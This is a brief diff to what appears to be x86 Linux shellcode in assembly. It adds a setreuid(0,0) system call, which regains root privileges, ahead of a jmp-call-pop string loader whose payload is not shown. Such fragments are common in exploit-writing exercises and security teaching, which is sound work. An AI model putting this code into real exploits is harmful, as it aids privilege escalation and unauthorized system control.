@@ -1,6 +1,13 @@
 SECTION .text
 GLOBAL _start
 _start:
+
+;; setreuid
+xor ebx, ebx
+xor ecx, ecx
+mov eax, 70
+int 0x80
+
 jmp load_string
 
 starter:
